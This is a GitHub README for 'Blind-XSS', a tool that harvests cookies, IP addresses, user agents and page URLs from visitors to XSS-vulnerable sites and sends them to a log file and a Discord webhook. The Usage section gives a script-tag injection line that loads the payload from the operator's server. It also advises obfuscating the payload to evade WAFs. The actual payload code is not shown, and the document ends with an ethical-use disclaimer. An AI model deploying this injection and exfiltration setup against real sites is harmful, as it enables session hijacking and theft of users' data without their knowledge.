# Blind-XSS

Blind-XSS is a project designed to capture sensitive information, such as cookies, user agents, and IP addresses, when a cross-site scripting (XSS) vulnerability is triggered on a target site. It provides basic logging capabilities and sends notifications via a Discord webhook whenever an XSS event is captured.

## Features
- Captures sensitive data triggered by an XSS attack:
  - Cookies
  - User location (URL)
  - IP address
  - User agent
  - Timestamp of event
- Stores captured data in a secure log file (`events.log`)
- Notifies via a Discord webhook with captured details

## Setup
Follow these steps to set up the project on your server.

1. **Clone the Repository**
   ```bash
   git clone https://github.com/Mrterrestrial/blind-xss.git
   cd blind-xss
   ```

2. **Configure Web Server**
- Ensure your web server (Apache, Nginx, etc.) is configured to serve the files in the `/server` directory.
- Secure the `/logs` folder from public access to prevent unauthorized viewing of captured data (e.g., using .htaccess or nginx location blocks).

3. **Install Dependencies**
- This project requires PHP and cURL to send notifications. Make sure both are installed and enabled on your server.


## Configuration

#### Environment Variables

To configure the project, you need to set up environment variables for sensitive information, specifically the `WEBHOOK_URL` used to send notifications to Discord.

1. **Set Up Environment Variables**
    - Create a `.env` file at the root of your project, or set the environment variables directly on your server:
    ```bash
    WEBHOOK_URL="https://your-discord-webhook-url.com/path"
    ```

## Usage


To use Blind-XSS, inject the JavaScript payload in an XSS-vulnerable page or field. This payload will capture data when a user visits the page with the injected script.

Inject the Payload:

Use the following script source to load payload.js from your server:
```bash 
<script src="https://your-server.com/server/payload.js"></script>
```
***Note***: You can encode or obfuscate the payload further if you need additional evasion from WAFs or other security filters.



## Testing

Before deploying in a live environment, perform the following tests in a test environment to verify functionality.

- **Webhook Notification**: Verify that notifications are sent to your Discord channel.
- **Log Capture**: Ensure that `events.log` captures data in JSON format.
- **Rate Limiting**: Confirm that multiple rapid triggers do not flood your logs or notifications.

Use test environments to avoid unnecessary alerts in production.

## Logging

Captured data will be saved to `logs/events.log` in JSON format. Each line represents a single captured event with details like cookies, IP address, and timestamp.

##### Sample Log Entry

```bash
{
    "cookie": "sample_cookie_value",
    "location": "https://target-site.com/vulnerable-page",
    "ip": "127.0.0.1",
    "user_agent": "Mozilla/5.0...",
    "timestamp": "2024-11-13 10:00:00"
}
```

## Limitations

- **Payload Detection**: WAFs or security filters might detect and block the payload, especially if they detect outgoing requests to unknown domains.
- **Browser Compatibility**: The payload depends on browser-specific features; results may vary across different browsers or devices.

## Security Considerations

To maintain the security of this project, adhere to the following recommendations:

- **Do Not Commit Sensitive Data**: Avoid committing the .env file or any configuration files with sensitive information to GitHub.
- **Restrict File Permissions**: 
    - Set the `events.log` file permissions to 600 to restrict access to only the server user.
    - Set `config.php` and other sensitive files to 600 permissions as well.

- **Secure Logs Folder**: Use `.htaccess` (for Apache) or equivalent configurations to prevent public access to the `/logs` folder.

## Disclaimer

This tool is intended for educational and ethical security testing purposes only. Unauthorized use against systems without permission is illegal and unethical. Please use responsibly.

## License

This project is licensed under the MIT License - see [MIT License](https://opensource.org/licenses/MIT) for details.

## Contributing

Feel free to fork the repository and submit pull requests. For any issues or feature requests, please open an issue on GitHub.
